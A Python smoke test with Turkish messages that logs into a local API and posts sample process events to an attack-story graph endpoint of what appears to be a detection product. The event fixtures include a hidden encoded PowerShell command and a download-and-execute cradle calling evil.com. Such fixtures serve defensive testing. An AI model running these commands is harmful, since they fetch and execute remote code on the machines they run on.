#!/usr/bin/env python3
"""
Story Graph Preview Smoke Test
===============================

POST /api/story/graph-preview endpoint'ini smoke test eder.
Login → token → raw_events payload → graph üretildi mi?

Kullanım:
    python story_graph_preview_smoke_test.py --password GucluSifre123!
    python story_graph_preview_smoke_test.py --base-url http://127.0.0.1:8000 --password SIFRE
"""

import argparse
import requests


def assert_status(resp, expected, step):
    if resp.status_code != expected:
        raise RuntimeError(
            f"{step} başarısız\nHTTP {resp.status_code}\nResponse: {resp.text}"
        )


def admin_login(base_url: str, username: str, password: str) -> str:
    r = requests.post(
        f"{base_url}/api/login",
        data={"username": username, "password": password},
        timeout=20,
    )
    assert_status(r, 200, "admin login")

    data = r.json()
    token = data.get("access_token")
    if not token:
        raise RuntimeError(f"access_token alınamadı. Response: {data}")
    return token


def auth_headers(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--username", default="admin")
    parser.add_argument("--password", required=True)
    parser.add_argument("--base-url", default="http://127.0.0.1:8000")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")

    # --- Step 1/5: Login ---
    print("[1/5] Admin login...")
    token = admin_login(base_url, args.username, args.password)
    headers = auth_headers(token)
    print("  OK")

    # --- Step 2/5: POST /api/story/graph-preview ---
    print("[2/5] Story graph preview — raw_events...")
    payload = {
        "source_type": "raw_events",
        "items": [
            {
                "type": "PROCESS_START",
                "hostname": "SMOKE-TEST-HOST",
                "user": "smoke_admin",
                "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgA",
                "severity": "HIGH",
                "risk_score": 75,
            },
            {
                "type": "PROCESS_START",
                "hostname": "SMOKE-TEST-HOST",
                "user": "smoke_admin",
                "command_line": "powershell.exe Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/p')",
                "severity": "HIGH",
                "risk_score": 80,
            },
        ],
    }
    r = requests.post(
        f"{base_url}/api/story/graph-preview",
        json=payload,
        headers=headers,
        timeout=30,
    )
    assert_status(r, 200, "story graph preview")
    data = r.json()
    print("  OK")

    # --- Step 3/5: Summary doğrulama ---
    print("[3/5] Summary doğrulama...")
    summary = data.get("summary", {})
    total_events = summary.get("total_events", 0)
    total_groups = summary.get("total_groups", 0)
    total_stories = summary.get("total_stories", 0)
    graph_count = summary.get("graph_count", 0)
    total_nodes = summary.get("total_nodes", 0)
    total_edges = summary.get("total_edges", 0)

    print(f"  summary.total_events : {total_events}")
    print(f"  summary.total_groups : {total_groups}")
    print(f"  summary.total_stories: {total_stories}")
    print(f"  summary.graph_count  : {graph_count}")
    print(f"  summary.total_nodes  : {total_nodes}")
    print(f"  summary.total_edges  : {total_edges}")

    assert total_events >= 2, f"total_events beklenen >= 2, gelen: {total_events}"
    assert total_groups >= 1, f"total_groups beklenen >= 1, gelen: {total_groups}"
    assert total_stories >= 1, f"total_stories beklenen >= 1, gelen: {total_stories}"
    assert graph_count >= 1, f"graph_count beklenen >= 1, gelen: {graph_count}"
    assert total_nodes > 0, f"total_nodes beklenen > 0, gelen: {total_nodes}"
    assert total_edges > 0, f"total_edges beklenen > 0, gelen: {total_edges}"
    print("  OK")

    # --- Step 4/5: Graph node/edge kontrolü ---
    print("[4/5] Graph node/edge kontrolü...")
    graphs = data.get("story_graphs", [])
    assert len(graphs) >= 1, f"story_graphs boş, beklenen >= 1"

    first_graph = graphs[0]
    nodes = first_graph.get("nodes", [])
    edges = first_graph.get("edges", [])

    print(f"  graph[0].nodes: {len(nodes)}")
    print(f"  graph[0].edges: {len(edges)}")

    assert len(nodes) > 0, "graph[0].nodes boş"
    assert len(edges) > 0, "graph[0].edges boş"
    print("  OK")

    # --- Step 5/5: Story detay kontrolü ---
    print("[5/5] Story detay kontrolü...")
    stories = data.get("attack_stories", [])
    assert len(stories) >= 1, f"attack_stories boş, beklenen >= 1"

    first_story = stories[0]
    title = first_story.get("title", "")

    print(f"  story_title: {title}")

    assert title, "attack_stories[0].title boş"
    print("  OK")

    print("\nStory graph preview smoke test tamam ✅")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
